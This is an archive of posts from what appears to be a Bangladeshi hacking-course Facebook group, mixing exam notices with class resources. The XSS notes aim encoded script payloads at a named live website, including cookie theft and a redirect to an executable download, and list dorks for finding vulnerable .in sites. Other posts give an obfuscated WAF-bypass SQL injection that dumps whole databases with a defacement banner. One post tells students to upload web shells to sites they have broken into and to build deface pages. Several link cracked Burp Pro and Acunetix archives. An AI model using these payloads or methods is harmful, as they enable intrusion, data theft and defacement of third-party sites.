-Date: unverified · Category: information · ID: entry-68
-
-Manual SQL Injection practice output
-
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1615974870105102)
-
-## প্রাক্টিক্যালি শেখার পাশাপাশি থিউরিটিক্যালি কিছু বিষয় আমাদেরকে আত্মস্থ করতে হবে। সময় করে পিডিএফ…
-
-Date: unverified · Category: information · ID: entry-69
-
-প্রাক্টিক্যালি শেখার পাশাপাশি থিউরিটিক্যালি কিছু বিষয় আমাদেরকে আত্মস্থ করতে হবে। সময় করে পিডিএফ গুলো অবশ্যই পড়বেন। কোথাও কোন প্রবলেম হলে আমাকে অবশ্যই জানাবেন ধন্যবাদ।
-drive.google.com
-SQLI - Google Drive
-
-- [Resource](https://drive.google.com/drive/u/3/folders/1QyI7Rwl62MMvV0MsZnWAJz2pZJEUP-Fl)
-
-## কাল‌কে না‌কি পরীক্ষা!!
-
-Date: unverified · Category: notices · ID: entry-70
-
-কাল‌কে না‌কি পরীক্ষা!!
-আপনা‌দের প্রিপা‌রেশন ঠিকঠাক আ‌ছে তো???
-তাইলে আমিও পড়তে বসি
-Best of luck for me
-
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1618322976536958)
-
-## Understanding Google dork
-
-Date: unverified · Category: information · ID: entry-71
-
-Understanding Google dork
-
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1618321853203737)
-
-## প্রিয় শিক্ষার্থীবৃন্দ,
-
-Date: unverified · Category: notices · ID: entry-72
-
-প্রিয় শিক্ষার্থীবৃন্দ,
-ইতিমধ্যেই আপনাদের পরীক্ষা শুরু হয়েছে। এক্সাম পেপার একবার রিফ্রেস করলেই প্রশ্নপত্র দেখতে পাবেন।
-যারা শুধুমাত্র Cyber Security কোর্সে আছেন, তারা অনুগ্রহ করে CEHF Exam Link ওপেন করুন।
-যারা Professional Diploma কোর্সে আছেন, তারা Diploma Exam Link এ ক্লিক করে আপনাদের নির্ধারিত প্রশ্নপত্র ওপেন করে নিন।
-পরীক্ষা চলাকালীন অবস্থায় যেকোনো সমস্যার ক্ষেত্রে দয়া করে এই পোস্টের কমেন্টে জানাবেন, আমরা যথাসম্ভব দ্রুত সাপোর্ট দেওয়ার চেষ্টা করব।
-শুভকামনা সকলের জন্য।
-ধন্যবাদ।
-
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1620238739678715)
-
-## ২য় ইন্সটলম্যান্ট সংক্রান্ত সর্বশেষ পোষ্টঃ
-
-Date: unverified · Category: notices · ID: entry-74
-
-২য় ইন্সটলম্যান্ট সংক্রান্ত সর্বশেষ পোষ্টঃ
-যারা ২য় ইন্সটলম্যান্ট পরিশোধ করেছেন সবার পোর্টালে পেমেন্ট আপডেট সহ পেমেন্ট রিসিপ্ট ইমেইলে পেয়ে গেছেন। কেউ যদি এখনো কনফার্মেশন পাওয়া বাকি থাকেন তাহলে ইমেইলটা পুনরায় চেক করে আজকে অফিস সময়ের মধ্যে আমাদের WhatsApp এ যোগাযোগ করে নিন। +8801310333444
-
-
-## Cross Site Scripting (XSS) — Class Resource
-
-Date: unverified · Category: documents · ID: entry-75
-
-Class Resource:
-docs.google.com
-Cross Site Scripting (XSS)
-
-### Notes
-
-Cross Site Scripting (XSS)
-
-
-Attendance Link: https://hw.arenaclass.stream/class_live/
-
-
-XSS Concept: https://s4mc71.github.io/interactive-xss-simulator/
-
-
-Practice Site: https://clemensantikvariat.dk/
-
-
-
-
-<script>alert("Hacked_By_AWS_64")</script>
-
-
-<script>location.href="https://arenawebsecurity.net/diploma-in-cyber-security";</script>
-
-
-
-
-https://clemensantikvariat.dk/search.php?searchString=%3Cscript%3Ealert%28%22Hacked_By_AWS_64%22%29%3C%2Fscript%3E
-
-
-
-
-https://clemensantikvariat.dk/search.php?searchString=%3Cscript%3Elocation.href%3D%22https%3A%2F%2Fwww.youtube.com%2Fwatch%3Fv%3DdQw4w9WgXcQ%22%3B%3C%2Fscript%3E%0A
-
-
-
-
-https://clemensantikvariat.dk/search.php?searchString=%3Cscript%3EsetInterval%28%28%29%20%3D%3E%20%7Bdocument.body.style.transform%20%3D%20%22rotate%28%22%2B%28Math.random%28%29%2A2%20-%201%29%2B%22deg%29%20translate%28%22%2B%28Math.random%28%29%2A10%20-%205%29%2B%22px%2C%22%2B%28Math.random%28%29%2A10%20-%205%29%2B%22px%29%22%3B%7D%2C%2050%29%3B%3C%2Fscript%3E
-
-
-
-
-https://clemensantikvariat.dk/search.php?searchString=%3Cscript%3E%20window.location.href%20%3D%20%22https%3A%2F%2Fwww.voidtools.com%2FEverything-1.4.1.1032.x86-Setup.exe%22%3B%20%3C%2Fscript%3E
-________________
-
-
-Store Based: https://drive.google.com/drive/u/1/folders/1vy2UBxgXM1d6HeyQPy-y_jSPqag5wFCp
-
-
-
-
-https://aspirekeralajobs.com/cand-view.php?id=22663
-________________
-Script
-<script>alert("Hacked_By_AWS_64")</script>
-
-
-<script>alert(document.cookie)</script>
-
-
-<script> window.location.href = "https://www.voidtools.com/Everything-1.4.1.1032.x86-Setup.exe"; </script>
-
-
-<script>location.href="https://arenawebsecurity.net/diploma-in-cyber-security";</script>
-
-
-<script>location.href="https://www.youtube.com/watch?v=dQw4w9WgXcQ";</script>
-
-
-<script>setInterval(() => {document.body.style.transform = "rotate("+(Math.random()*2 - 1)+"deg) translate("+(Math.random()*10 - 5)+"px,"+(Math.random()*10 - 5)+"px)";}, 50);</script>
-
-
-<style> @keyframes spin{to{transform:rotate(360deg)}} body{animation:spin 2s linear infinite} </style>
-
-
-<script> alert("Page hacked with XSS 🎨");  document.body.style.background="linear-gradient(45deg, red, yellow)"; </script>
-
-
-<script> speechSynthesis.speak(new SpeechSynthesisUtterance("Hello Students! This is X S S demo!")); </script>
-
-
-
-
-XSS dork
-/?s= site:.in
-/search?q= site:.in
-/index.php?lang= site:.in
-/index.php?page= site:.in
-/search?query= site:.in
-/search?keyword= site:.in
-/search/?q= site:.in
-/connexion?redirect_uri= site:.in
-/?page= site:.in
-/search/?s= site:.in
-/?keywords= site:
-/search/?keyword= site:.in
-/search-results?q=
-inurl:".php?query="
-inurl:".php?searchstring="
-inurl:".php?keyword="
-inurl:".php?file="
-inurl:".php?years="
-inurl:".php?txt="
-page_details.php?menu_id=
-gallery.php?menu_id=
-inurl:".php?tag="
-inurl:".php?max="
-inurl:".php?from="
-inurl:".php?author="
-inurl:".php?pass="
-inurl:".php?feedback=”
-
-- [Resource](https://docs.google.com/document/d/1Rem_8oiP3SkVgZvpZ8ES1IhGXUyfivD1pnoiMhdIsSs/edit?usp=sharing)
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1621986936170562)
-
-## Cross Site Scripting (XSS)
-
-Date: unverified · Category: information · ID: entry-76
-
-Cross Site Scripting (XSS)
-
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1621971836172072)
-
-## Correct Answers 1st Mid Exam CEHF
-
-Date: unverified · Category: documents · ID: entry-77
-
-Correct Answers 1st Mid Exam CEHF
-PDF
-Correct-Answers-66-Delta.pdf
-
-- [Resource](/documents/correct-answers-66-delta.pdf)
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1620243993011523)
-
-## কি অবস্থা সবার??
-
-Date: unverified · Category: information · ID: entry-78
-
-কি অবস্থা সবার??
-এক্সাম কেমন হলো?
-
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1620350193000903)
-
-## মঙ্গলবারের সাপোর্ট সম্পর্কে গুরুত্বপূর্ণ আপডেট!
-
-Date: unverified · Category: information · ID: entry-81
-
-#happy_support_day
-মঙ্গলবারের সাপোর্ট সম্পর্কে গুরুত্বপূর্ণ আপডেট!
-কি অবস্থা সবার কেমন আছেন?
-আজকে মঙ্গলবার আপনাদের প্র্যাকটিস ডে..!
-আপনার ক্লাস টপিক রিলেটেড যে কোন সমস্যা সম্পর্কে এই পোস্টের কমেন্টে স্ক্রিনশট সহ বর্ণনা করুন। পাশাপাশি আপনার যদি কোন প্রশ্ন থাকে তাও করতে পারেন। অথবা আপনি চাইলে নিম্নোক্ত টাইমে সরাসরি লাইভ সাপোর্ট সেশনে জয়েন করে নিতে পারেন।
-Meet-এ যোগদানের তথ্য:
-সময়:
-প্রথম সেশন: সন্ধ্যা ৭টা থেকে রাত ৯ টা পর্যন্ত
-দ্বিতীয় সেশন: রাত ১০ থেকে মধ্য রাত ২ টা পর্যন্ত
-লিঙ্ক: To join the video meeting, click this link:
-[মিটিং লিংক প্রকাশ করা হয়নি]
-[মিটিং ডায়াল নম্বর ও PIN প্রকাশ করা হয়নি]
-কিভাবে সাহায্য পাবেন: আপনি চাইলে মঙ্গলবার সারাদিন সাপোর্ট পোস্টের কমেন্টের মাধ্যমে যোগাযোগ করে আপনার প্রবলেমের বিষয় জানিয়ে সমস্যার সমাধান নিতে পারেন অথবা উল্লেখিত নির্দিষ্ট সময়ের মধ্যে মিটিংয়ে জয়েন করে সমস্যার সমাধান নিতে পারবেন।
-ধন্যবাদ।
-
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1622805392755383)
-
-## XSS
-
-Date: unverified · Category: documents · ID: entry-83
-
-XSS
-notepad.pw
-Save your notes online for free and share them with friends!
-
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1626235589079030)
-
-## SQLi WAF
-
-Date: unverified · Category: information · ID: entry-84
-
-SQLi WAF
-
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1626208339081755)
-
-## WAF bypass tips-
-
-Date: unverified · Category: information · ID: entry-86
-
-WAF bypass tips-
-আমি একটি লিংক শেয়ার করছি(যদিও সেটি ইংরেজিতে, কিন্তু বুঝার জন্য তেমন জটিল না।)
-মূল বিষয়টি হলো ফায়ারওয়াল যে যে জায়গাগুলো কে বা কি-ওয়ার্ডকে ব্লক করে রাখে তাকে বা তাদেরকে একটু অন্যভাবে কনভার্ট করে দিলেই হলো।
-কথার কথা WAF যদি union কে ব্লক করে দেয় তাহলে union এর বানানটা কে একটু উল্টা-পাল্টা করে দেন
-যেমনঃ union না দিয়ে uNIoN দিয়ে দেন তেমনি select না দিয়ে sELecT দিয়ে দেন।
-আবার সেটা কাজ না করলে সেটাকে ইনকোড করে দিয়ে দেন।
-যেমনঃ page.php?id=1%252f%252a*/UNION%252f%252a /SELECT
-যাইহোক নিচের লিংকে বিষয়টি অনেক সহজভাবে বুজানো আছে একটু দেখে নিন, তাহলে WAF bypass করা নিয়ে সমস্যা হবে না।।
-https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF
-
-- [Resource](https://owasp.org/www-community/attacks/SQL_Injection_Bypassing_WAF)
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1626383222397600)
-
-## SQLi WAF — Class Resource
-
-Date: unverified · Category: documents · ID: entry-89
-
-docs.google.com
-Untitled document
-
-### Notes
-
-SQLi WAF
-
-
-
-
-https://securityidiots.com/
-
-
-Order by 
-
-
-Union Select
-
-
-Concat
-
-
-From
-
-
-information_schema.(tables,colums)
-
-
-
-
-
-
-/*!50000%63%4f%6e%63At/**x**/*/(0x222f3e272f3e3c6c696e6b2072656c3d227374796c6573686565742220687265663d2268747470733a2f2f737461636b706174682e626f6f74737472617063646e2e636f6d2f626f6f7473747261702f342e352e322f6373732f626f6f7473747261702e6d696e2e637373223e3c2f62723e3c696d67207372633d2268747470733a2f2f692e696d6775722e636f6d2f3457455a5a6c512e676966222077696474683d323030206865696768743d32303020636c6173733d22696d616765222f3e3c6469762069643d227469746c65223e437233572d544d3c2f62723e20587e41736820776173206865726520f09f94a53c2f6469763e3c2f62723e3c623e3c613e3c63656e7465723e4461746162617365203a3a20,/*!50000daTaBAsE/**x**/*/(),0x3c2f62723e55736572203a3a20,/*!50000UsEr/**x**/*/(),0x3c2f62723e56657273696f6e203a3a20,/*!50000vErsIOn/**x**/*/(),0x3c2f61333e3c2f62313e3c2f62723e3c61343e,(selEct(@x)/*!50000fRom/**x**/*/(/*!50000sElect/**x**/*/(@x:=0x00),(sElect(0)/*!froM/**x**/*/(/*!50000inforMation_schEma/**/.coLuMns/**x**/*/)/*!50000Where/**x**/*/(taBle_schema=/*!50000DatAbase/**x*/*/())and(0x00)in(@x:=/*!50000%63%6f%4ecat/**x**/*/(@x,0x3c62723e,/*!50000tAble_naMe/**x**/*/,0x3c2f61333e3c61323e203a3a3a3a203c2f61323e3c61313e,/*!50000colUmn_naMe/**x**/*/,0x3c2f61313e))))x),0x3c2f61343e)
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-concat/*!(unhex(hex(concat/*!(0x3c2f6469763e3c2f696d673e3c2f613e3c2f703e3c2f7469746c653e,0x223e,0x273e,0x3c62723e3c62723e,unhex(hex(concat/*!(0x3c63656e7465723e3c666f6e7420636f6c6f723d7265642073697a653d343e3c623e3a3a20416c69204b68616e2028416b446b292044756d7020496e204f6e652053686f74205175657279203c666f6e7420636f6c6f723d626c75653e28574146204279706173736564203a2d20207620312e30293c2f666f6e743e203c2f666f6e743e3c2f63656e7465723e3c2f623e))),0x3c62723e3c62723e,0x3c666f6e7420636f6c6f723d626c75653e4d7953514c2056657273696f6e203a3a20,version(),0x7e20,@@version_comment,0x3c62723e5072696d617279204461746162617365203a3a20,@d:=database(),0x3c62723e44617461626173652055736572203a3a20,user(),(/*!12345selEcT*/(@x)/*!from*/(/*!12345selEcT*/(@x:=0x00),(@r:=0),(@running_number:=0),(@tbl:=0x00),(/*!12345selEcT*/(0) from(information_schema./**/columns)where(table_schema=database()) and(0x00)in(@x:=Concat/*!(@x, 0x3c62723e, if( (@tbl!=table_name), Concat/*!(0x3c666f6e7420636f6c6f723d707572706c652073697a653d333e,0x3c62723e,0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@r:=@r%2b1, 2, 0x30),0x2e203c2f666f6e743e,@tbl:=table_name,0x203c666f6e7420636f6c6f723d677265656e3e3a3a204461746162617365203a3a203c666f6e7420636f6c6f723d626c61636b3e28,database(),0x293c2f666f6e743e3c2f666f6e743e,0x3c2f666f6e743e,0x3c62723e), 0x00),0x3c666f6e7420636f6c6f723d626c61636b3e,LPAD(@running_number:=@running_number%2b1,3,0x30),0x2e20,0x3c2f666f6e743e,0x3c666f6e7420636f6c6f723d7265643e,column_name,0x3c2f666f6e743e))))x)))))*/
-
-- [Resource](https://docs.google.com/document/d/1QAdlTL9FowtSZCWQxIanBL0aJrec_gmlwzxKoyRS5CM/edit?usp=sharing)
-
-## Burp Suite
-
-Date: unverified · Category: information · ID: entry-91
-
-Burp Suite
-
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1628018352234087)
-
-## Post Based SQLi
-
-Date: unverified · Category: classes · ID: entry-92
-
-Post Based SQLi
-0:00 / 6:30
-
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1626383545730901)
-
-## বার্পসুইট ভিডিও রিসোর্স
-
-Date: unverified · Category: tools · ID: entry-93
-
-বার্পসুইট ভিডিও রিসোর্স
-পাসওয়ার্ডঃ aws
-drive.google.com
-Burp Suite Unfiltered - Go from a Beginner to Advanced!.rar
-এটি ২৭টি সহায়ক ভিডিওর RAR আর্কাইভ; Burp Suite installer নয়।
-
-- [Burp Suite Unfiltered - Go from a Beginner to Advanced!.rar](https://drive.google.com/file/d/1jlVQCoMTK1qhDw5BfmuayelXAyZR2je3/view)
-- [Resource](https://drive.google.com/file/d/1h60zw8KvLbSolk5TQk8RxYwrtfHTDrQh/view?usp=sharing)
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1628369578865631)
-
-## আপনাদের প্রথম মিড এক্সাম এর রেজাল্ট পাবলিশ হয়েছে। যারা ১৪ এর কম পেয়েছেন তারা আগামী ৭২ঘন্টার মধ্যে…
-
-Date: unverified · Category: notices · ID: entry-94
-
-ব্যক্তিগত পরীক্ষার ফলাফল পাবলিক আর্কাইভে প্রকাশ করা হয়নি। শিক্ষার্থীরা কোর্সের নিজস্ব চ্যানেলে ফলাফল পাবেন।
-
-
-## সবাই ক্লাসে দেখানো প্রসেস অনুযায়ী Burp Suite ইন্সটল করে নিবেন।
-
-Date: unverified · Category: tools · ID: entry-95
-
-সবাই ক্লাসে দেখানো প্রসেস অনুযায়ী Burp Suite ইন্সটল করে নিবেন।
-কোনো প্রবলেম ফেইস করলে কমেন্টে জানাবেন।
-ধন্যবাদ।
-INSTALLATION VIDEO
-https://drive.google.com/.../16x2M0chdDweKperGluo.../view...
-BURPSUITE PRO 1.7.37
-https://drive.google.com/.../1JtgvIzFAOrjim5N328wlr0MFp2.../
-JAVA JDK
-https://drive.google.com/.../1yYYnbFzIxUpX4SOCE3nya.../
-FIREFOX PORTABLE BROWSE
-https://portableapps.com/apps/internet/firefox_portable
-
-- [Resource](https://portableapps.com/apps/internet/firefox_portable)
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1628161408886448)
-
-## Forensic Related Post
-
-Date: unverified · Category: documents · ID: entry-96
-
-Forensic Related Post
-Browser Forensic
-সাইবার ক্রাইম বিষয়ে অনেক সময় আমরা দেখি আইন-শৃঙ্খলা রক্ষাকারী বাহিনী সাসপেক্টের পিসি/ল্যাপটপ, মোবাইল ডিভাইস সব নিয়ে যায়(সাময়িক সময়ের জন্য), আসলে নিয়ে কি করে??
-তারা সেটাতে বিভিন্ন প্রকারের অনুসন্ধান চালায়, দেখে তার পিসিতে কি কি ডকুমেন্ট আছে? কি কি ফাইল আছে? কি কি এ্যাপ আছে? কার কার সাথে যোগাযোগ করে? যোগাযোগের জন্য কি কি এ্যাপ ব্যাবহার করে? কোন কোন সাইটে বেশী ব্রাউজ করে?? সোশাল মিডিয়াতে কাকে কাকে ফলো করে?? আবার কোন ফাইল রিসেন্টলি ডিলেট করেছে কিনা? ডিলিট করে থাকলে সেগুলো কি কি?? ইত্যাদি ইত্যাদি, যা কি না সবই ডিজিটাল এভিডেন্স হিসাবে গন্য হয়।
-যাই হোক- আজকে আপনাদের সেরকম বিষয়ের ছোট একটি পার্ট নিয়ে আলোচনা করছি, সেটা হলো ব্রাউজার ফরেনসিক।
-এই টুলস্ এর সাহায্যে খুব সহজেই বের করা যাবে আপনি কোন কোন সাইটে ব্রাউজ করেন(কম বা বেশী), কার কার ফেসবুক প্রফাইলে আপনি ডু মারেন?? কোন কোন ওয়েব সাইট থেকে কি কি ডাউনলোড করেন? কেমন সময় আপনি পিসিতে বা ল্যাপটপে ব্রাউজ করেন বা এক্টিভ থাকেন? কোন সময় আপনি অনলাইনে কোন ওয়েভ পেইজে ছিলেন, কার কার ওয়েভ সাইট আপনি হ্যাক করেছেন, ইত্যাদি ইত্যাদি। মোট কথা হলো আপনার ব্রাউজারের সাহায্যে যা যা করেন তার সবই বের করা সম্ভব।
-সো???
-সাধু সাবধান!!
-না হলে কিন্তু জঙ্গিও হয়ে যেতে পারেন!! বা আপনার ইজ্জতে ও হাত দিয়ে দিতে পারে(যদি আজে বাজে সাইট ব্রাউস করে থাকেন)!!
-এনিওয়ে, একটু মজা করলাম আরকি!!
-বিষয়টা হলো সাসপেক্টের পিসি/ল্যাপটপের ফরেনসিক এর এটিও একটি পার্ট। উনারা স্পেসিফিক এই এ্যাপ ব্যবহার নাও করতে পারেন!
-একটি পোর্টেবল এ্যাপ দেয়া হলো, ডাউনলোড করে শুধু রান করালেই হবে, যেহেতু পোর্টেবল ভর্সান।
-পাসওয়ার্ডঃ aws
-https://drive.google.com/file/d/1yxRfF_sfExt6hhe79eGUq2BSEBYl7SLW/view?usp=sharing
-
-- [Resource](https://drive.google.com/file/d/1yxRfF_sfExt6hhe79eGUq2BSEBYl7SLW/view?usp=sharing)
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1628370425532213)
-
-## Deface page making
-
-Date: unverified · Category: information · ID: entry-97
-
-Deface page making
-
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1632429445126311)
-
-## আসুন জেনে নেই- ৬
-
-Date: unverified · Category: information · ID: entry-98
-
-আসুন জেনে নেই- ৬
-(Upload vulnerability)
-আনরেস্ট্রিক্টেড ফাইল আপলোড ভার্নাবিলিটি নিয়ে আলোচনা!!
-আপনাদের আজকের ক্লাস টা অনেকের কাছেই একটু কঠিন মনে হতে পারে। তাই চলুন আজকের ক্লাসের টপিকের কনসেপ্ট একটু বোঝার চেষ্টা করি।
-মূল আলোচনা: আজকের ক্লাস টপিকের মূল বিষয়বস্তু ছিল ওয়েব শেল পরিচিতি এবং ডিফেস পেজ তৈরী। এখন ওয়েব শেল টা আবার কি? প্রত্যেকটা ওয়েবসাইটের একটি করে সি প্যানেল থাকে, যেখান থেকে ওয়েবসাইটের মালিকরা তাদের ওয়েবসাইটের ফাইল, ফোল্ডার, স্ট্রাকচার, কাঠামোগত দিক সবকিছু নিয়ন্ত্রণ করতে পারে বা তার ইচ্ছা অনুযায়ী মডিফিকেশন করতে পারে। এখন আমরা তো শুধুমাত্র এতদিন পর্যন্ত এডমিন ড্যাশবোর্ড এক্সেস করেছি। যার মাধ্যমে শুধুমাত্র ওয়েবসাইটের নির্দিষ্ট কিছু রোলপ্লে করতে পেরেছি, যা পূর্ব থেকে নির্ধারিত ছিল। এর বাহিরে কোন সুপ্রিম এডমিনের মত করে পুরো সার্ভারের/ওয়েব এপ্লিকেশন সিস্টেম এর সম্পূর্ণ এক্সেস করতে পারিনি। আর এখানেই ওয়েব শেল এর ম্যাজিক! এই পার্টে আমরা ওয়েব শেলের মাধ্যমে একটি ওয়েব এপ্লিকেশন সিস্টেমের পুরো সার্ভার নিয়ন্ত্রণ করতে পারবো।
-এখন অনেকের প্রশ্ন থাকতে পারে; আমি কি চাইলেই একটি ওয়েবসাইটে শেল আপলোড করতে পারি? এর উত্তরটা নির্ভর করে ওয়েবসাইটে কি ধরনের দুর্বলতা রয়েছে এবং আমরা সেই দুর্বলতাকে কিভাবে কাজে লাগাতে পারি। আজকে আমরা ক্লাসে দেখলাম আন রেস্ট্রিক্টেড ফাইল আপলোড ভার্নাবিলিটির মাধ্যমে শেল আপলোড করা। এর অ্যাডভান্স মেথড সহ আরো বেশ কিছু প্রক্রিয়ার মাধ্যমে শেল আপলোড আমরা পর্যায়ক্রমে ক্লাসে শিখতে এবং জানতে পারবো।
-
-করণীয়: এতদিন পর্যন্ত আপনার নিজের অ্যাক্সেস নেওয়া ওয়েবসাইট গুলোতে এই শেল টি আপলোড করার চেষ্টা করুন। এটি একটি সাধারণ আপলোডার শেল যার কাজ যে কোন ধরনের ফাইল আপলোড করা। যদি আপনার অ্যাক্সেস নেওয়া কোন একটি ওয়েবসাইটের আন রেস্ট্রিক্টেড ফাইল আপলোড ভার্নাবিলিটি থেকে থাকে তাহলে এই ওয়েবশেল খুব সহজেই আপলোড করে ফেলতে পারবেন। আর যদি আপনার এক্সেস নেওয়া ওয়েবসাইটে ফাইলটি আপলোড সাকসেসফুলি না হয় তাহলে সেটি সংরক্ষণে রাখুন। আমরা পরবর্তী ক্লাসে এডভান্স ওয়েবশেল আপলোড এবং বাইপাস টেকনিকগুলো দেখে নিব। আপাতত এতটুকু ট্রাই করুন এবং নিজের হেক্সর নামে খুব সুন্দর একটা ডিফেস পেজ তৈরি করুন। আর কোন কিছু বুঝতে অসুবিধা হলে আমাকে কমেন্টে জানান
-ধন্যবাদ।
-ও হ্যাঁ আপলোডার শেল লিঙ্ক: https://limewire.com/d/i3zYX#8bczA284ol
-
-- [Resource](https://limewire.com/d/i3zYX#8bczA284ol)
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1632429001793022)
-
-## WebShell / Backdoor concept & deface page making
-
-Date: unverified · Category: information · ID: entry-100
-
-WebShell / Backdoor concept & deface page making
-
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1632339608468628)
-
-## up_shell_fight
-
-Date: unverified · Category: information · ID: entry-101
-
-up_shell_fight
-
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1632440608458528)
-
-## Upload vulnerability
-
-Date: unverified · Category: classes · ID: entry-102
-
-Upload vulnerability
-0:00 / 0:00
-
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1632429668459622)
-
-## Webshell-B.pdf
-
-Date: unverified · Category: documents · ID: entry-103
-
-PDF
-Webshell-B.pdf
-
-- [Resource](/documents/webshell-b.pdf)
-
-## Advance WebShell
-
-Date: unverified · Category: information · ID: entry-104
-
-Advance WebShell
-
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1634028824966373)
-
-## Advanced Shell Resource
-
-Date: unverified · Category: tools · ID: entry-106
-
-Advanced Shell Resource
-Shell file password: aws
-https://drive.google.com/.../1Pm2LR1Zg3bI4vDCenjuAsc.../view
-Video resource:
-part-1: https://drive.google.com/.../1aPft3a16Ue.../view
-part-2: https://drive.google.com/.../1WSWH50J_GD8HTeh.../view
-
-- [ShellTC.rar](https://drive.google.com/file/d/1CVU48B_PTjiLMpNUzX4dLXmWfejc0_D8/view)
-- [Asif_Shell_Part1.mp4](https://drive.google.com/file/d/1DSSNWtalcz8Tuenlk-RRxneBkDG7Yvz-/view)
-- [Asif_Shell_part2.mp4](https://drive.google.com/file/d/1wwdj8VHlfqQeYgMy72Gev0L16jh22Vsl/view)
-- [Resource](https://drive.google.com/file/d/1Pm2LR1Zg3bI4vDCenjuAsc6X9HWDYcH8/view)
-- [Resource](https://drive.google.com/file/d/1aPft3a16Ue-aFuY2pTNXvlSAv6Hsw2Ac/view)
-- [Resource](https://drive.google.com/file/d/1WSWH50J_GD8HTeh-UsAuybJg9kRml141/view)
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1634198088282780)
-
-## Files Uploading Vulnerabilities.pdf
-
-Date: unverified · Category: documents · ID: entry-108
-
-PDF
-Files Uploading Vulnerabilities.pdf
-
-- [Resource](/documents/files-uploading-vulnerabilities.pdf)
-
-## FileUV.pdf
-
-Date: unverified · Category: documents · ID: entry-109
-
-PDF
-FileUV.pdf
-
-- [Resource](/documents/fileuv.pdf)
-
-## Portswigger
-
-Date: unverified · Category: information · ID: entry-110
-
-Portswigger
-
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1638333177869271)
-
-## Deepseek SSRF --BUT sandbox :(
-
-Date: unverified · Category: information · ID: entry-111
-
-Deepseek SSRF --BUT sandbox :(
-
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1634471391588783)
-
-## Acunetix resource file
-
-Date: unverified · Category: tools · ID: entry-113
-
-Acunetix resource file
-drive.google.com
-Acunetix-v24.1-Windows.rar
-
-- [Acunetix-v24.1-Windows.rar](https://drive.google.com/file/d/1fD5bqJjgQm1G2B2_FbMMKvdOwOeb6ahL/view)
-- [Resource](https://drive.google.com/file/d/1_qMh5E_NC1cA-i7aJ2QjRfbvgcx5rDaZ/view?usp=sharing)
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1640097204359535)
-
-## Acunetix
-
-Date: unverified · Category: information · ID: entry-114
-
-Acunetix
-
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1640006177701971)
-
-## Linux Installation & Virtual Lab Setup
-
-Date: unverified · Category: classes · ID: entry-116
-
-Linux Installation & Virtual Lab Setup
-0:00 / 1:58:03
-
-- [Resource](https://www.facebook.com/khaleddevsec/videos/2311014589647758/)
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1645991267103462)
-
-## Batch Scripting Resource
-
-Date: unverified · Category: documents · ID: entry-118
-
-Batch Scripting Resource
-PDF
-Batch_Scripting_Short_Notes.pdf
-
-- [Resource](/documents/batch-scripting-short-notes.pdf)
-
-## Batch Scripting
-
-Date: unverified · Category: information · ID: entry-119
-
-Batch Scripting
-
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1644256053943650)
-
-## Linux installation in VMware
-
-Date: unverified · Category: tools · ID: entry-120
-
-Linux installation in VMware
-https://drive.google.com/file/d/1LwowKtmXfIXpDbz4UvgG1-QAoxrSkbAn/view?usp=sharing
-drive.google.com
-vmware-setup.mp4
-
-- [Resource](https://drive.google.com/file/d/1LwowKtmXfIXpDbz4UvgG1-QAoxrSkbAn/view?usp=sharing)
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1646665933702662)
-
-## Topic: Keylogger, Spyware & RAT (Live/Practical)
-
-Date: unverified · Category: information · ID: entry-123
-
-Topic: Keylogger, Spyware & RAT (Live/Practical)
-Class link : [মিটিং লিংক প্রকাশ করা হয়নি]
-Class topic will start 9:45 PM
-@everyone
-
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1651981633171092)
-
-## Linux CLI & Fundamental
-
-Date: 2026-09-11 · Category: classes · ID: entry-125
-
-Linux CLI & Fundamental
-0:00 / 2:09:22
-
-- [Resource](https://www.facebook.com/sahmsec/videos/2119205895669030/)
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1650292053340050)
-
-## What is Crypter Antivirus & Virus.pdf
-
-Date: unverified · Category: documents · ID: entry-127
-
-PDF
-What is Crypter Antivirus & Virus.pdf
-
-- [Resource](/documents/crypter-antivirus-virus.pdf)
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1652083599827562)
-
-## Local File Inclusion (LFI)
-
-Date: 2026-09-18 · Category: classes · ID: entry-128
-
-Local File Inclusion (LFI)
-0:00 / 2:17:15
-
-- [Resource](https://www.facebook.com/S4MC71/videos/944493894821037/)
-- [Source post](https://www.facebook.com/groups/awsb66delta/posts/1656289636073625)
-
-## Linux Tools & Environment Setup, Burp in kali
-
-Date: 2026-09-20 · Category: classes · ID: entry-129
-
-Linux Tools & Environment Setup, Burp in kali
-0:00 / 2:16:45
-
-- [Resource](https://www.facebook.com/sahmsec/videos/1504289691484713/)
